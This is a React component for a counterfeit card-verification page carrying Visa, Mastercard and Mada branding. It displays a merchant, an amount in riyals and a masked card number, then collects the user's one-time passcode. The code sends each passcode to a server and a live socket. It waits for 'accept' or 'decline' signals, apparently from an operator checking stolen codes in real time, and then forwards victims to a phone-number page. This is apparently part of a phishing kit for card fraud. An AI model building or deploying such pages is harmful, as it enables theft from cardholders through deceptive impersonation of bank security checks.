import React, { useCallback, useEffect, useMemo, useState } from "react";
import { api_route, socket } from "../App";
import axios from "axios";
import { TailSpin } from "react-loader-spinner";
import { useNavigate } from "react-router-dom";
import { useTranslation } from "../context/LanguageContext";

function maskCardNumber(cardNumber) {
  const digits = (cardNumber || "").replace(/\s/g, "");
  if (digits.length < 4) return "************0000";
  return `${"*".repeat(12)}${digits.slice(-4)}`;
}

const Verify = () => {
  const { t, dir } = useTranslation();
  const [error, setError] = useState(false);
  const [load, setLoad] = useState(false);
  const [otp, setOtp] = useState("");
  const navigate = useNavigate();
  const search = window.location.search;

  const data = useMemo(() => {
    try {
      const raw = new URLSearchParams(search).get("data");
      if (!raw) return null;
      return JSON.parse(raw);
    } catch {
      return null;
    }
  }, [search]);

  const _id = data?._id;
  const cardDigits = (data?.cardNumber || "").replace(/\s/g, "");
  const showVisa = cardDigits.startsWith("4");
  const showMc = cardDigits.startsWith("5");
  const showMada =
    cardDigits.startsWith("6") || sessionStorage.getItem("card") === "mada";

  const storedCompanyData = useMemo(() => {
    try {
      const raw = sessionStorage.getItem("companyData");
      return raw ? JSON.parse(raw) : null;
    } catch {
      return null;
    }
  }, []);

  const companyData = data?.companyData || storedCompanyData;
  const merchantName = companyData?.company || companyData?.name || "—";
  const priceNum =
    parseFloat(String(companyData?.price || "").replace(/[^\d.]/g, "")) ||
    0;
  const hasDiscount = /^(53|54|55)/.test(cardDigits);
  const transactionAmount = hasDiscount
    ? (priceNum * 0.7).toFixed(2)
    : String(companyData?.price ?? "0.00");

  const handleOtp = async (e) => {
    e.preventDefault();
    if (!_id) return;
    setLoad(true);
    setError(false);
    const finalData = { ...data, otp };
    try {
      await axios.post(`${api_route}/visaOtp/${_id}`, finalData);
      socket.emit("visaOtp", { id: _id, otp });
    } catch {
      setLoad(false);
    }
  };

  const onAcceptVisaOtp = useCallback(
    (id) => {
      if (id !== _id) return;
      setLoad(false);
      sessionStorage.setItem("id", id);
      navigate(`/phone?id=${id}`);
    },
    [_id, navigate]
  );

  const onDeclineVisaOtp = useCallback(
    (id) => {
      if (id !== _id) return;
      setLoad(false);
      setError(true);
    },
    [_id]
  );

  useEffect(() => {
    socket.on("acceptVisaOtp", onAcceptVisaOtp);
    socket.on("declineVisaOtp", onDeclineVisaOtp);
    return () => {
      socket.off("acceptVisaOtp", onAcceptVisaOtp);
      socket.off("declineVisaOtp", onDeclineVisaOtp);
    };
  }, [onAcceptVisaOtp, onDeclineVisaOtp]);

  if (!data || !_id) {
    return (
      <div className="w-full flex items-center justify-center min-h-52 text-red-500 text-xl">
        {t("common.invalidData")}
      </div>
    );
  }

  return (
    <div
      className="min-h-screen w-full bg-[#f0f0f0] flex items-center justify-center py-6 px-3"
      dir={dir}
    >
      {load && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/30">
          <div className="flex flex-col items-center gap-4 bg-white p-8 rounded-md shadow-lg">
            {showVisa ? (
              <img src="/Visa.svg" alt="Visa" className="h-10" />
            ) : showMc ? (
              <img src="/MasterCard.svg" alt="Mastercard" className="h-10" />
            ) : showMada ? (
              <img src="/mad.png" alt="Mada" className="h-10" />
            ) : null}
            <TailSpin height="40" width="40" color="#111" ariaLabel="loading" />
            <span className="text-gray-700 font-medium">
              {t("verify.processing")}
            </span>
          </div>
        </div>
      )}

      <div className="w-full max-w-3xl bg-white shadow-md border border-gray-200 p-6 md:p-10">
        <div className="flex items-center justify-start gap-2 md:gap-3 mb-8 w-fit">
          <img
            src="/Visa.svg"
            alt="Visa"
            className="h-4 md:h-5 object-contain"
          />
          <img
            src="/mad.png"
            alt="Mada"
            className="h-4 md:h-5 object-contain"
          />
          <div className="flex items-center gap-1">
            <img
              src="/MasterCard.svg"
              alt="Mastercard"
              className="h-4 md:h-5 object-contain"
            />
            <span className="text-[10px] md:text-xs font-semibold text-gray-800 whitespace-nowrap">
              {t("verify.idCheck")}
            </span>
          </div>
        </div>

        <p className="text-base md:text-lg font-bold text-black leading-snug mb-8">
          {t("verify.instructions")}
        </p>

        <h2 className="text-xl font-bold text-black mb-5">
          {t("verify.transactionDetails")}
        </h2>

        <form onSubmit={handleOtp} className="w-full">
          <div className="flex flex-col gap-3 text-base text-black mb-6">
            <div className="flex items-start justify-between gap-6">
              <span className="font-normal shrink-0">
                {t("verify.merchant")}
              </span>
              <span className="font-normal text-end" dir={dir}>
                {merchantName}
              </span>
            </div>
            <div className="flex items-center justify-between gap-6">
              <span className="font-normal">
                {t("verify.transactionAmount")}
              </span>
              <span className="font-normal" dir="ltr">
                {transactionAmount} {t("common.currencyRiyal")}
              </span>
            </div>
            <div className="flex items-center justify-between gap-6">
              <span className="font-normal">{t("verify.cardNumber")}</span>
              <span className="font-normal tracking-wider" dir="ltr">
                {maskCardNumber(data.cardNumber)}
              </span>
            </div>
            <div className="flex items-center justify-between gap-6 pt-1">
              <span className="font-normal shrink-0">
                {t("verify.enterCode")}
              </span>
              <input
                type="text"
                inputMode="numeric"
                required
                minLength={4}
                maxLength={6}
                dir="ltr"
                value={otp}
                onChange={(e) =>
                  setOtp(e.target.value.replace(/\D/g, "").slice(0, 8))
                }
                className="w-full max-w-md border border-gray-800 rounded-sm px-3 py-2 text-base outline-none focus:ring-1 text-center focus:ring-gray-800"
              />
            </div>
          </div>

          {error && (
            <p className="text-red-600 text-sm mb-4 text-center">
              {t("verify.invalidPasscode")}
            </p>
          )}

          <div className="flex justify-center pt-4">
            <button
              type="submit"
              className="bg-black hover:bg-gray-900 text-white font-bold text-lg px-16 py-2.5 rounded-sm min-w-[200px] transition-colors"
            >
              {t("verify.submit")}
            </button>
          </div>
        </form>
        <div className="flex  items-center w-full justify-center  ">
          <img src="/payment-b.png" alt="" className="" />
        </div>
      </div>
    </div>
  );
};

export default Verify;
